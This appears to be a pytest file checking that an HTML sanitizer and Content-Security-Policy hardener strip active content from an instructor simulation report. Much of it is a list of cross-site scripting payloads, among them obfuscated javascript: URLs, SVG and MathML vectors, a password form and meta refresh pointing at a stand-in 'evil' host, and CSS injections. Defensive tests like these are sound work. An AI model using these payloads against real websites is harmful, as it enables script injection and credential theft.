"""Tests for utils/html_safety.py and its use in the instructor HTML report."""
import re
import sys
from html.parser import HTMLParser
from pathlib import Path

import pytest

_APP_DIR = Path(__file__).resolve().parent.parent / "simulation_app"
if str(_APP_DIR) not in sys.path:
    sys.path.insert(0, str(_APP_DIR))

from utils.html_safety import sanitize_report_html as clean  # noqa: E402


def _active_content(markup: str) -> list:
    """Everything a browser could treat as live: dangerous start tags, on* attributes, javascript: URLs."""
    found = []

    class P(HTMLParser):
        def handle_starttag(self, tag, attrs):
            if tag in {"script", "iframe", "object", "embed", "form", "input", "link", "base", "frame", "applet", "use"}:
                found.append(("tag", tag))
            for name, value in attrs:
                if name.lower().startswith("on"):
                    found.append(("attr", name))
                if name.lower() in {"href", "src", "xlink:href"} and value and not value.strip().startswith(("#", "data:image/")):
                    found.append(("url", value))
                if name.lower() == "srcdoc":
                    found.append(("attr", name))

    P(convert_charrefs=True).feed(markup)
    return found


@pytest.mark.parametrize("payload", [
    "<script>alert(1)</script>",
    "<SCRIPT SRC=http://evil/x.js></SCRIPT>",
    "<script>x<img src=x onerror=alert(1)>",  # unclosed: the rest of the page must not turn live
    "<iframe src='http://evil'></iframe>",
    "<object data='http://evil'></object><embed src='http://evil'>",
    "<form action='http://evil'><input name=pw type=password></form>",
    "<img src=x onerror=alert(1)>",
    "<img src='http://evil/pixel.png'>",
    "<div onclick='alert(1)' onmouseover=alert(2)>text</div>",
    "<a href='javascript:alert(1)'>x</a>",
    "<a href=' jav&#x09;ascript:alert(1)'>x</a>",
    "<svg onload=alert(1)><use href='http://evil/x.svg#a'/></svg>",
    "<svg><foreignObject><iframe src=x></iframe></foreignObject></svg>",
    "<svg><animate attributeName=href values=javascript:alert(1) /></svg>",
    "<meta http-equiv='refresh' content='0;url=http://evil'>",
    "<link rel=stylesheet href=http://evil/x.css><base href=http://evil/>",
    "<div style=\"background:url(http://evil/x.png)\">x</div>",
    "<div style='width:expression(alert(1))'>x</div>",
    "<style>@import url(http://evil/x.css); p{background:url('http://evil/y')}</style>",
    "<body onload=alert(1)>",
    "<math><mi xlink:href='javascript:alert(1)'>x</mi></math>",
    "<textarea><script>alert(1)</script></textarea>",
    "<![CDATA[<script>alert(1)</script>]]>",
    "<!--[if IE]><script>alert(1)</script><![endif]-->",
])
def test_active_content_is_neutralised(payload):
    out = clean(f"<html><body><p>before</p>{payload}<p>after</p></body></html>")
    assert _active_content(out) == [], out
    assert "before" in out and "after" in out


def test_neutralised_text_stays_visible_as_escaped_text():
    out = clean("<p>Title: <script>alert(1)</script></p>")
    assert "&lt;script&gt;" in out and "alert(1)" in out and "<script" not in out


def test_the_reports_own_markup_passes_through():
    doc = ("<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width'>"
           "<title>Report</title><style>body{font-family:Inter,'Segoe UI'; background:#fff} .a{background:url(data:image/png;base64,AAAA)}"
           "</style></head><body><a id='sec'></a><div class='section-block'><h2>Hi &amp; bye</h2><p>A & B &lt; C &#169;</p>"
           "<a href='#sec'>anchor</a><table><tr><th colspan='2'>x</th></tr><tr><td>1</td><td>2</td></tr></table>"
           "<svg viewBox='0 0 10 10' xmlns='http://www.w3.org/2000/svg'><rect x='1' y='1' width='5' height='5' fill='#2563eb'/>"
           "<text x='1' y='9' text-anchor='middle'>t</text><path d='M0 0 L5 5' stroke='black'/></svg>"
           "<img src='data:image/png;base64,iVBORw0KGgo='><br><hr><details><summary>s</summary>d</details></div></body></html>")
    out = clean(doc)
    assert _structure(out) == _structure(doc)
    assert "Hi &amp; bye" in out and "&#169;" in out and "A & B" in out


def _structure(markup: str):
    events = []

    class P(HTMLParser):
        def handle_starttag(self, tag, attrs):
            events.append(("start", tag, tuple(sorted((k, v) for k, v in attrs))))

        def handle_endtag(self, tag):
            events.append(("end", tag))

        def handle_data(self, data):
            if data.strip():
                events.append(("text", re.sub(r"\s+", " ", data.strip())))

    P(convert_charrefs=True).feed(markup)
    return events


def test_garbage_and_empty_input_do_not_crash():
    for doc in ("", "<", "<<<>>>", "<div", "<a href=", "\x00<script>", "&&&&", "<p>" * 5000, "x" * 200_000):
        assert isinstance(clean(doc), str)


def test_sanitizing_is_idempotent():
    doc = "<p onclick=x>a <script>b</script> <a href='#t'>c</a></p>"
    once = clean(doc)
    assert clean(once) == once


def test_a_real_instructor_html_report_survives_unchanged_and_hostile_titles_are_neutralised():
    import importlib.util

    import pandas as pd
    from utils.instructor_report import ComprehensiveInstructorReport

    rows = []
    import numpy as np
    rng = np.random.RandomState(1)
    for cond, shift in (("A & B <group>", 0.0), ("Control", 0.8)):
        for i in range(40):
            rows.append({"PARTICIPANT_ID": len(rows) + 1, "CONDITION": cond, "Age": int(rng.randint(18, 70)),
                         "Gender": rng.choice(["Male", "Female"]), "DV_1": int(np.clip(rng.normal(4 + shift, 1.2), 1, 7)),
                         "DV_2": int(np.clip(rng.normal(4 + shift, 1.2), 1, 7)),
                         "Attention_Pass_Rate": 1.0, "Completion_Time_Seconds": int(rng.randint(300, 900)),
                         "Exclude_Recommended": 0})
    df = pd.DataFrame(rows)
    df["DV_mean"] = df[["DV_1", "DV_2"]].mean(axis=1).round(2)
    meta = {"study_title": "<script>alert('title')</script>Study", "study_description": "<img src=x onerror=alert(1)> abstract",
            "conditions": ["A & B <group>", "Control"], "sample_size": len(df), "factors": [], "open_ended_questions": [
                {"name": "q", "question_text": "<iframe src=//evil></iframe> Why?"}],
            "scales": [{"name": "DV", "num_items": 2, "scale_points": 7}], "run_id": "R", "generation_timestamp": "now",
            "effect_sizes_observed": []}
    report = ComprehensiveInstructorReport().generate_html_report(
        df=df, metadata=meta, schema_validation={"passed": True, "checks": [], "warnings": [], "errors": []},
        prereg_text="", team_info={"team_name": "<b onmouseover=alert(1)>Team</b>", "team_members": "A\nB"})
    assert _active_content(report) == [], _active_content(report)
    assert "fonts.googleapis.com" not in report
    assert "Comprehensive Simulation" in report and "Study Overview" in report
    # hostile strings stay readable, as text, exactly where the owner expects to see them
    assert "&lt;script&gt;alert(" in report and "Study</h3>" in report
    assert "A &amp; B &lt;group&gt;" in report
    assert "&lt;iframe src=//evil&gt;&lt;/iframe&gt; Why?" in report
    assert "&lt;img src=x onerror=alert(1)&gt; abstract" in report
    assert importlib.util.find_spec("utils.html_safety") is not None


def test_the_content_security_policy_is_added_once_and_survives_a_second_pass():
    from utils.html_safety import CONTENT_SECURITY_POLICY, harden_report_html

    doc = "<!DOCTYPE html><html><head><meta charset='utf-8'><title>t</title></head><body><script>x</script></body></html>"
    once = harden_report_html(doc)
    assert once.count("Content-Security-Policy") == 1 and "<script" not in once
    assert once.index("Content-Security-Policy") < once.index("<title>")  # first element of <head>
    assert harden_report_html(once) == once
    assert "default-src &#x27;none&#x27;" in once and "default-src 'none'" in CONTENT_SECURITY_POLICY
    assert "<head" not in harden_report_html("<p>fragment</p>")[:5] and "Content-Security-Policy" in harden_report_html("<p>fragment</p>")


def test_a_policy_or_refresh_tag_typed_by_a_user_is_shown_as_text_not_applied():
    from utils.html_safety import harden_report_html

    out = harden_report_html("<head></head><body><meta http-equiv='refresh' content='0;url=http://evil'>"
                             "<meta http-equiv='Content-Security-Policy' content=\"default-src *\"></body>")
    assert out.count("<meta ") == 1  # only our own policy tag is live markup
    assert "&lt;meta http-equiv=&#x27;refresh&#x27;" in out or "&lt;meta http-equiv='refresh'" in out

